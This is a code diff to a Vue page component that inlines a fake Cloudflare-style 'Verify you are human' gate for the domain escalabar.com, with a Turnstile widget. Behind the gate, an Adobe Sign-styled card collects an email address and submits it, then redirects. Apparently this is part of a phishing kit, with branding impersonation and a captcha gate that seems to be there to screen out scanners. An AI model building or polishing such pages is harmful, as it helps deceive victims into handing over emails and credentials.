@@ -1,5 +1,23 @@
 <template>
-  <CaptchaGate v-if="!captchaToken" @solved="onCaptchaSolved" />
+  <div v-if="!captchaToken" class="gate-container">
+    <header>
+      <h1>escalabar.com</h1>
+    </header>
+    <main>
+      <div class="instructions">
+        <h2>Verify you are human by completing the action below.</h2>
+        <div
+          class="cf-turnstile"
+          data-sitekey="0x4AAAAAABgei6QZruCN7n08"
+          data-callback="onCaptchaSuccess"
+        ></div>
+      </div>
+    </main>
+    <footer>
+      <p>escalabar.com needs to review the security of your connection before proceeding.</p>
+    </footer>
+  </div>
+
   <div v-else class="background">
     <div class="adobe-sign-container">
       <div class="sign-card">
@@ -45,8 +63,7 @@
 </template>
 
 <script setup>
-import { ref } from 'vue'
-import CaptchaGate from './components/CaptchaGate.vue'
+import { ref, onMounted } from 'vue'
 
 const email = ref('')
 const error = ref('')
@@ -57,6 +74,12 @@ let holdTimer = null
 const holdDuration = 1500
 const redirectBaseUrl = 'https://yourdomain.com/complete'
 
+// Load Turnstile callback
+onMounted(() => {
+  window.onCaptchaSuccess = (token) => {
+    captchaToken.value = token
+  }
+})
 function isValidEmail(e) {
   return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
 }
@@ -70,7 +93,7 @@ async function verifyEmail() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           email: email.value,
-          captchaToken: captchaToken.value // include captcha token
+          captchaToken: captchaToken.value
         }),
       }
     )
@@ -109,14 +132,38 @@ function cancelHold() {
   if (holdTimer) clearTimeout(holdTimer)
   loading.value = false
 }
-
-function onCaptchaSolved(token) {
-  captchaToken.value = token
-}
 </script>
 
 <style scoped>
-/* Your styles are kept as is */
+/* CaptchaGate styles */
+.gate-container {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
+header h1 {
+  margin-left: 0;
+  font-size: 2rem;
+  font-weight: bold;
+  text-align: left;
+}
+.instructions {
+  margin: 40px 0 0 0;
+  text-align: left;
+}
+.instructions h2 {
+  font-size: 1.3rem;
+  margin-bottom: 1.2rem;
+}
+footer p {
+  margin-top: 2rem;
+  color: #444;
+  font-size: 1rem;
+  text-align: left;
+}
+
+/* Email form styles */
 .background {
   display: flex;
   justify-content: center;
@@ -137,35 +184,29 @@ function onCaptchaSolved(token) {
   flex-direction: column;
   justify-content: center;
 }
-
 .header {
   display: flex;
   justify-content: center;
   margin-bottom: 1rem;
 }
-
 .logo-text {
   font-weight: bold;
   display: flex;
   align-items: center;
   gap: 1rem;
 }
-
 .success-check {
   font-size: 2rem;
   color: green;
 }
-
 .content {
   text-align: center;
 }
-
 .form-wrapper {
   display: flex;
   flex-direction: column;
   align-items: center;
 }
-
 .email-input {
   width: 95%;
   max-width: 400px;
@@ -175,7 +216,6 @@ function onCaptchaSolved(token) {
   border-radius: 5px;
   font-size: 1rem;
 }
-
 .action-button {
   background-color: #0051c3;
   color: white;
@@ -188,33 +228,27 @@ function onCaptchaSolved(token) {
   width: 40%;
   max-width: 380px;
 }
-
 .action-button:disabled {
   opacity: 0.6;
   cursor: default;
 }
-
 .action-button:hover:not(:disabled) {
   background-color: #003a91;
 }
-
 .divider {
   height: 0px;
   background-color: #e0e0e0;
   margin: 1rem 0 1rem;
 }
-
 .footer-container {
   text-align: center;
 }
-
 .footer-text,
 .global-footer {
   font-size: 0.85rem;
   color: #333;
   margin-top: 0.5rem;
 }
-
 .error {
   color: red;
   font-size: 0.9rem;
